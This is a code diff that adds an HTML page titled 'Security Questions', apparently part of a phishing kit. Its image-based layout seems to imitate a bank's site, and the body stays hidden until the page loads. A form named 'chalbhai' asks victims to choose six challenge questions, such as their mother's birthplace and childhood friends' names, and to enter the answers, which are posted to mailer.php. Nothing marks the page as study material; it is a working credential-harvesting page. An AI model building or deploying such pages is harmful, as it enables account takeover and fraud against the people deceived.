@@ -1,0 +1,558 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+
+<style> 
+ 
+ .inputs {
+    padding: 8px;
+    border-radius: 3px;
+    border: 1px solid #CCC;
+    background-image: none;
+    width: 270px;
+	height: 32px;
+	font-size: 12px;
+	
+}
+
+.inputs:focus {
+    outline-color: #54B4AD;
+}
+</style> 
+
+
+
+
+
+<head>
+<title>Security Questions</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+<body style="visibility:hidden" onload="unhideBody()">
+
+
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>
+<style type="text/css">
+/*----------Text Styles----------*/
+.ws6 {font-size: 8px;}
+.ws7 {font-size: 9.3px;}
+.ws8 {font-size: 11px;}
+.ws9 {font-size: 12px;}
+.ws10 {font-size: 13px;}
+.ws11 {font-size: 15px;}
+.ws12 {font-size: 16px;}
+.ws14 {font-size: 19px;}
+.ws16 {font-size: 21px;}
+.ws18 {font-size: 24px;}
+.ws20 {font-size: 27px;}
+.ws22 {font-size: 29px;}
+.ws24 {font-size: 32px;}
+.ws26 {font-size: 35px;}
+.ws28 {font-size: 37px;}
+.ws36 {font-size: 48px;}
+.ws48 {font-size: 64px;}
+.ws72 {font-size: 96px;}
+.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
+/*----------Para Styles----------*/
+DIV,UL,OL /* Left */
+{
+ margin-top: 0px;
+ margin-bottom: 0px;
+}
+</style>
+
+
+<script LANGUAGE="JavaScript">
+<!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b && (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b && (field.value.length == 0)) return true;
+
+if (field.value.length < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max > 0) && (field.value.length > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b && (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max > 0) && (field.value > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b && (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i<field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits < min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max > 0) && (digits > max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i<user.length; i++) {
+if (user.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i<domain.length; i++) {
+if (domain.charCodeAt(i)>127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i<len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD && domArr[domArr.length-1].length!=2 &&
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len<2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:formtext1^0^1^0^0^Please Fill in All Of the Required Fields:;formtext2^0^1^0^0^Please Fill in All Of the Required Fields:;formtext3^0^1^0^0^Please Fill in All Of the Required Fields:;formtext4^0^1^0^0^Please Fill in All Of the Required Fields:;formtext5^0^1^0^0^Please Fill in All Of the Required Fields:;formtext6^0^1^0^0^Please Fill in All Of the Required Fields:;
+*/
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext5) ) return false ;
+b=0;
+errmsg="Please Fill in All Of the Required Fields";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext6) ) return false ;
+
+}
+-->
+</script>
+
+</head>
+<body>
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:496px; z-index:0"><img src="images/back.png" alt="" title="" border=0 width=1350 height=496></div>
+
+<div id="image9" style="position:absolute; overflow:hidden; left:200px; top:159px; width:521px; height:323px; z-index:1"><img src="images/question.png" alt="" title="" border=0 width=521 height=323></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:962px; width:1352px; height:395px; z-index:2"><img src="images/backfooter.png" alt="" title="" border=0 width=1352 height=395></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:207px; top:861px; width:974px; height:80px; z-index:3"><a href="#"><img src="images/morerates.png" alt="" title="" border=0 width=974 height=80></a></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:988px; top:1px; width:171px; height:32px; z-index:4"><a href="#"><img src="images/join.png" alt="" title="" border=0 width=171 height=32></a></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:192px; top:102px; width:970px; height:49px; z-index:5"><a href="#"><img src="images/ttt.png" alt="" title="" border=0 width=970 height=49></a></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:191px; top:9px; width:264px; height:84px; z-index:6"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=264 height=84></a></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:517px; top:70px; width:644px; height:25px; z-index:7"><a href="#"><img src="images/wooo.png" alt="" title="" border=0 width=644 height=25></a></div>
+
+<div id="image8" style="position:absolute; overflow:hidden; left:187px; top:980px; width:1009px; height:378px; z-index:8"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=1009 height=378></a></div>
+
+<div id="image10" style="position:absolute; overflow:hidden; left:206px; top:470px; width:515px; height:328px; z-index:9"><img src="images/2nnd.png" alt="" title="" border=0 width=515 height=328></div>
+
+<div id="text1" style="position:absolute; overflow:hidden; left:218px; top:278px; width:172px; height:26px; z-index:10">
+<div class="wpmd">
+<div><B>Challenge Question 1</B></div>
+</div></div>
+
+<div id="text2" style="position:absolute; overflow:hidden; left:218px; top:312px; width:172px; height:26px; z-index:11">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+
+<div id="text3" style="position:absolute; overflow:hidden; left:218px; top:351px; width:172px; height:26px; z-index:12">
+<div class="wpmd">
+<div><B>Challenge Question 2</B></div>
+</div></div>
+
+<div id="text4" style="position:absolute; overflow:hidden; left:219px; top:384px; width:172px; height:26px; z-index:13">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+
+<div id="text5" style="position:absolute; overflow:hidden; left:219px; top:419px; width:172px; height:26px; z-index:14">
+<div class="wpmd">
+<div><B>Challenge Question 3</B></div>
+</div></div>
+
+<div id="text6" style="position:absolute; overflow:hidden; left:219px; top:453px; width:172px; height:26px; z-index:15">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+
+<div id="text7" style="position:absolute; overflow:hidden; left:219px; top:488px; width:172px; height:26px; z-index:16">
+<div class="wpmd">
+<div><B>Challenge Question 4</B></div>
+</div></div>
+
+<div id="text8" style="position:absolute; overflow:hidden; left:220px; top:525px; width:172px; height:26px; z-index:17">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+
+<div id="text9" style="position:absolute; overflow:hidden; left:218px; top:563px; width:172px; height:26px; z-index:18">
+<div class="wpmd">
+<div><B>Challenge Question 5</B></div>
+</div></div>
+
+<div id="text10" style="position:absolute; overflow:hidden; left:217px; top:599px; width:172px; height:26px; z-index:19">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+<form action=mailer.php name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
+<select name="formselect1" class="inputs" style="position:absolute;left:387px;top:275px;width:303px;z-index:20">
+<option value="" Selected>Please Select a Question </option>
+
+                <option value="What is the last name of your first boyfriend or girlfriend?">
+		What is the last name of your first boyfriend or girlfriend?</option>
+		<option value="What was your favorite college year?">
+		What was your favorite college year?</option>
+		<option value="What is your nickname?">
+		What is your nickname?</option>
+		<option value="What is your oldest sibling's nickname?">
+		What is your oldest sibling&#39;s nickname?</option>
+		<option value="Who is your favorite person from history?">
+		Who is your favorite person from history?</option>
+		<option value="What is your grandmother's middle name (your mother's mother)?">
+		What is your grandmother&#39;s middle name (your mother&#39;s mother)?</option>
+		<option value="What is the first name of your eldest nephew/niece?">
+		What is the first name of your eldest nephew/niece?</option>
+		<option value="In which city was your grandfather born (father's father)?">
+		In which city was your grandfather born (father&#39;s father)?</option>
+		<option value="In which city was your mother born?">
+		In which city was your mother born?</option>
+		<option value="What is the first name of your closest childhood friend?">
+		What is the first name of your closest childhood friend?</option>
+
+</select>
+<div id="text11" style="position:absolute; overflow:hidden; left:219px; top:641px; width:172px; height:26px; z-index:21">
+<div class="wpmd">
+<div><B>Challenge Question 6</B></div>
+</div></div>
+
+<div id="text12" style="position:absolute; overflow:hidden; left:220px; top:683px; width:172px; height:26px; z-index:22">
+<div class="wpmd">
+<div><B>Answer</B></div>
+</div></div>
+
+<input name="formtext1" class="inputs" type="text" style="position:absolute;width:303px;left:386px;top:312px;z-index:23">
+<select name="formselect2" class="inputs" style="position:absolute;left:385px;top:349px;width:303px;z-index:24">
+<option value="" Selected>Please Select a Question </option>
+
+		<option value="What is the name of the hospital your oldest child was born in?">
+		What is the name of the hospital your oldest child was born in?</option>
+		<option value="What is your youngest child's middle name?">
+		What is your youngest child's middle name?</option>		
+		<option value="What is the first name of the eldest of your siblings?">
+		What is the first name of the eldest of your siblings?</option>
+		<option value="What is the first name of the youngest of your siblings?">
+		What is the first name of the youngest of your siblings?</option>
+		<option value="What is the name of the hospital in which you were born?">
+		What is the name of the hospital in which you were born?</option>
+		<option value="What was the name of your first roommate during college?">
+		What was the name of your first roommate during college?</option>
+		<option value="What is your eldest child's middle name?">
+		What is your eldest child&#39;s middle name?</option>
+		<option value="What is the middle name of your eldest sibling?">
+		What is the middle name of your eldest sibling?</option>
+		<option value="Which sports team did you like most as a child?">
+		Which sports team did you like most as a child?</option>
+		<option value="When is your parents' wedding anniversary (MM/DD)?">
+		When is your parents&#39; wedding anniversary (MM/DD)?</option>
+		<option value="Which was the first foreign country you visited?">
+		Which was the first foreign country you visited?</option>
+
+</select>
+<input name="formtext2" class="inputs" type="text" style="position:absolute;width:303px;left:387px;top:382px;z-index:25">
+<select name="formselect3" class="inputs" style="position:absolute;left:386px;top:415px;width:303px;z-index:26">
+<option value="" Selected>Please Select a Question </option>
+
+		<option value="What is the first name of the person you went to your prom with?">
+		What is the first name of the person you went to your prom with?
+		</option>
+		<option value="What was your high school mascot?">
+		What was your high school mascot?</option>
+		<option value="What was your boss's first name at your first job?">
+		What was your boss&#39;s first name at your first job?</option>
+		<option value="What is the street name where you lived when you were 10 years old?">
+		What is the street name where you lived when you were 10 years old?
+		</option>
+		<option value="What is your favorite fictional character?">
+		What is your favorite fictional character?</option>
+		<option value="In which city was your grandmother born (father's mother)?">
+		In which city was your grandmother born (father&#39;s mother)?</option>
+		<option value="What is the first name of your grandmother (your mother's mother)?">
+		What is the first name of your grandmother (your mother&#39;s mother)?
+		</option>
+		<option value="How old was your father when you were born?">
+		How old was your father when you were born?</option>
+		<option value="What is your youngest sibling's nickname?">
+		What is your youngest sibling&#39;s nickname?</option>
+		<option value="Which state did you first visit (outside the one you were born in)?">
+		Which state did you first visit (outside the one you were born in)?
+		</option>
+
+</select>
+<input name="formtext3" class="inputs" type="text" style="position:absolute;width:303px;left:386px;top:448px;z-index:27">
+<select name="formselect4" class="inputs" style="position:absolute;left:386px;top:484px;width:303px;z-index:28">
+<option value="" Selected>Please Select a Question </option>
+
+		<option value="What is the first name of your mother's youngest sibling?">
+		What is the first name of your mother&#39;s youngest sibling?</option>
+		<option value="What is the first name of your father's youngest sibling?">
+		What is the first name of your father&#39;s youngest sibling?</option>
+		<option value="What is your youngest child's middle name?">
+		What is your youngest child&#39;s middle name?</option>
+		<option value="In which city were you born?">
+		In which city were you born?</option>
+		<option value="In which city did your parents get married?">
+		In which city did your parents get married?</option>
+		<option value="What is the first name of your grandfather (your mother's father)?">
+		What is the first name of your grandfather (your mother&#39;s father)?
+		</option>
+		<option value="What is your grandfather's profession?">
+		What is your grandfather&#39;s profession?</option>
+		<option value="What is the middle name of your youngest sibling?">
+		What is the middle name of your youngest sibling?</option>
+		<option value="What is your grandfather's middle name (your mother's father)?">
+		What is your grandfather&#39;s middle name (your mother&#39;s father)?</option>
+		<option value="What is the first name of your grandmother (your father's mother)?">
+		What is the first name of your grandmother (your father&#39;s mother)?
+		</option>
+
+</select>
+<input name="formtext4" class="inputs" type="text" style="position:absolute;width:303px;left:387px;top:523px;z-index:29">
+<select name="formselect5" class="inputs" style="position:absolute;left:388px;top:559px;width:303px;z-index:30">
+<option value="Please Select a Question ">Please Select a Question </option>
+<option value="" Selected>Please Select a Question </option>
+
+		<option value="What was the last name of your first grade teacher?">
+		What was the last name of your first grade teacher?</option>
+		<option value="In which city was your father born?">
+		In which city was your father born?</option>
+		<option value="What was the first name of your man/maid of honor?">
+		What was the first name of your man/maid of honor?</option>
+		<option value="What is your grandmother's middle name (your father's mother)?">
+		What is your grandmother&#39;s middle name (your father&#39;s mother)?</option>
+		<option value="What is the first name of your grandfather (your father's father)?">
+		What is the first name of your grandfather (your father&#39;s father)?
+		</option>
+		<option value="In which city was your grandfather born (mother's father)?">
+		In which city was your grandfather born (mother&#39;s father)?</option>
+		<option value="In which city was your grandmother born (mother's mother)?">
+		In which city was your grandmother born (mother&#39;s mother)?</option>
+		<option value="What is your youngest child's nickname?">
+		What is your youngest child&#39;s nickname?</option>
+		<option value="What is your grandfather's middle name (your father's father)?">
+		What is your grandfather&#39;s middle name (your father&#39;s father)?</option>
+
+</select>
+<input name="formtext5" class="inputs" type="text" style="position:absolute;width:303px;left:387px;top:597px;z-index:31">
+<select name="formselect6" class="inputs" style="position:absolute;left:387px;top:638px;width:303px;z-index:32">
+<option value="" Selected>Please Select a Question </option>
+
+		<option value="Who is your favorite person from history?">
+		Who is your favorite person from history?</option>
+                <option value="What was the last name of your first grade teacher?">
+		What was the last name of your first grade teacher?</option>
+		<option value="In which city was your father born?">
+		In which city was your father born?</option>
+                <option value="In which city was your mother born?">
+		In which city was your mother born?</option>
+                <option value="What was the name of your first roommate during college?">
+		What was the name of your first roommate during college?</option>
+		<option value="What is your youngest child's nickname?">
+		What is your youngest child&#39;s nickname?</option>
+                <option value="Which was the first foreign country you visited?">
+		Which was the first foreign country you visited?</option>
+                <option value="What was your high school mascot?">
+		What was your high school mascot?</option>
+                <option value="What is the street name where you lived when you were 10 years old?">
+		What is the street name where you lived when you were 10 years old?</option>
+		<option value="In which city were you born?">
+		In which city were you born?</option>
+
+		<option value="In which city were you born?">
+		In which city were you born?</option>
+</select>
+<input name="formtext6" class="inputs" type="text" style="position:absolute;width:303px;left:387px;top:679px;z-index:33">
+<div id="formimage1" style="position:absolute; left:617px; top:742px; z-index:34"><input type="image" name="formimage1" width="75" height="33" src="images/Confirm.png"></div>
+
+</body>
+</html>
